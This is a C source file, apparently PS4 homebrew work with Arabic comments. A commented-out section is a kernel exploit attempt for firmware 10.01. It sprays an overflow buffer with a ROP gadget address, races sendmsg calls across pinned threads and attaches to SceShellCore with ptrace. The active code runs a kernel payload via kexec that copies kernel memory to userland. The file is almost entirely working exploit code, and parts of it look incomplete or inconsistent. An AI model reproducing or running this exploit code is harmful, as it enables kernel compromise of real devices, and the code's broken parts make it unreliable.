/*
#include <ps4.h>

// --- تعريف الهياكل يدوياً لضمان اكتمال الأنواع (Complete Types) ---
struct cmsghdr {
    uint32_t cmsg_len;
    int      cmsg_level;
    int      cmsg_type;
};

struct msghdr {
    void            *msg_name;
    uint32_t         msg_namelen;
    struct iovec    *msg_iov;
    int              msg_iovlen;
    void            *msg_control;
    uint32_t         msg_controllen;
    int              msg_flags;
};

// حل مشكلة cpuset_t يدوياً لأنها غالباً مفقودة في هيدرات الـ SDK الافتراضية
#ifndef _CPUSET_T_DECLARED
typedef struct { uint64_t bits[16]; } cpuset_t;
#define _CPUSET_T_DECLARED
#endif

#ifndef CPU_ZERO
#define CPU_ZERO(p) memset((p), 0, sizeof(cpuset_t))
#endif

#ifndef CPU_SET
#define CPU_SET(n, p) ((p)->bits[(n)/64] |= (1ULL << ((n)%64)))
#endif

// إعدادات الاستغلال (Offsets 10.01)
#define PS4_PAGE_SIZE 0x4000
#define OVERFLOW_SIZE 1024 
#define NCMSG         14
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

#ifndef PT_CONTINUE
#define PT_CONTINUE 7
#endif

uint8_t *BaseArea;
struct cmsghdr *ControlBuf;
size_t ControlBufLen;
volatile int stop_race = 0;
uint64_t n_tries = 0;
uint32_t current_delay = 50;

// --- 1. بناء البفر مع الرش الكثيف ---
void BuildPrecisionBuffer(uint64_t kbase) {
    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
    
    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ | PROT_WRITE, 0x0002 | 0x1000, -1, 0);
    mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE);

    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
    ControlBuf = (struct cmsghdr *)aligned_base;
    ControlBufLen = cmsgsize;

    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;

    // الرش التصاعدي: ملء المنطقة بالكامل بالعنوان لضمان عدم وجود أصفار
    for (size_t i = 0; i < OVERFLOW_SIZE - 8; i += 8) {
        *(uintptr_t *)(overflow_ptr + i) = trigger;
    }

    for (int i = 0; i < NCMSG; i++) {
        ControlBuf[i].cmsg_len = (uint32_t)sizeof(struct cmsghdr);
        ControlBuf[i].cmsg_level = 0;
        ControlBuf[i].cmsg_type = 7; 
    }
}

// --- 2. خيط التخريب (Wrecker) ---
void *wrecker_thread(void *arg) {
    (void)arg;
    while (!stop_race) {
        ControlBuf[NCMSG-1].cmsg_len = (uint32_t)sizeof(struct cmsghdr);
        for(volatile uint32_t i = 0; i < current_delay; i++); 
        
        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
        for(volatile int i = 0; i < 60; i++);

        current_delay++;
        if (current_delay > 1500) current_delay = 50; 
    }
    return NULL;
}

// --- 3. خيط التنفيذ (Executor) ---
void *executor_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = ControlBuf;
    msg.msg_controllen = (uint32_t)ControlBufLen;
    const int bad_fd = 666;

    while (!stop_race) {
        n_tries++;
        syscall(28, bad_fd, &msg, 0); 
        
        if (errno == 14) { 
            stop_race = 1;
            break;
        }
    }
    return NULL;
}

// --- المدخل الرئيسي ---
int _main(struct thread *td) {
    (void)td;
    initKernel(); initLibc(); initSysUtil();
    
    // البحث والتعلق بـ SceShellCore باستخدام دوال الـ SDK
    int targetPID = findProcess("SceShellCore");
    if (targetPID > 0) {
        procAttach(targetPID);
        // استدعاء ptrace من الـ SDK لاستمرار العملية
        ptrace(PT_CONTINUE, targetPID, (void *)1, 0); 
    }

    uint64_t kbase = get_kernel_base();
    BuildPrecisionBuffer(kbase);

    // استخدام تعريفات cpuset_t التي أضفناها بالأعلى
    cpuset_t cpuset1, cpuset2;
    CPU_ZERO(&cpuset1); CPU_SET(1, &cpuset1); 
    CPU_ZERO(&cpuset2); CPU_SET(2, &cpuset2); 

    ScePthread wrid, exid;
    
    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
    pthread_setaffinity_np(wrid, sizeof(cpuset_t), &cpuset1);

    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");
    pthread_setaffinity_np(exid, sizeof(cpuset_t), &cpuset2);

    scePthreadJoin(exid, NULL);
    stop_race = 1;
    scePthreadJoin(wrid, NULL);

    if (targetPID > 0) {
        procDetach(targetPID);
    }

    return 0;
}
*/

#include "ps4.h"

struct args_t {
    uint64_t u_dst;
};

// ================= KERNEL PAYLOAD =================
int kpayload_test(struct thread *td, struct args_t *args) {
    UNUSED(td);

    void *kernel_base;
    uint8_t *kernel_ptr;

    int (*copyout)(const void *kaddr, void *uaddr, size_t len);

    uint16_t fw = get_firmware();

    // تهيئة copyout + kernel_base
    build_kpayload(fw, copyout_macro);

    uint64_t kbase = (uint64_t)kernel_base;

    void *src = (void *)(kbase + 0x1000 - 0x40);
    size_t len = 0x10;

    return copyout(src, (void *)args->u_dst, len);
}

// ================= USERLAND =================
int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initSysUtil();

    void *buf = mmap(NULL, 0x20,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1, 0);

    if (buf == MAP_FAILED) {
        printf_notification("mmap failed");
        return -1;
    }

    memset(buf, 0, 0x20);

    struct args_t args;
    args.u_dst = (uint64_t)buf;

    //
    if (kexec(&kpayload_test, &args) < 0) {
        printf_notification("kexec failed");
        munmap(buf, 0x20);
        return -1;
    }

    unsigned char *c = (unsigned char *)buf;

    printf_notification(
        "%02X %02X %02X %02X %02X %02X %02X %02X",
        c[0], c[1], c[2], c[3],
        c[4], c[5], c[6], c[7]
    );

    munmap(buf, 0x20);
    return 0;
}